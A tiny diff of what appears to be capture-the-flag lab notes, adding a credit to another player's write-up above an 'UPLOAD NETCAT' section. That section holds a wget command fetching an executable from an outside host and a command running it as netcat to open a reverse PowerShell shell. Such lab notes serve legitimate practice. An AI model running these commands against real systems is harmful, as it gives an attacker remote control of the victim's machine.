@@ -1,3 +1,4 @@
+//based on MinatoTW's writeup
 ------------------------------------------UPLOAD NETCAT----------------------------------------------
 wget http://10.10.14.18:8000/plswork.exe -o c:\\test\\plswork.exe
 c:\\test\\plswork.exe 10.10.14.18 9001 -e powershell
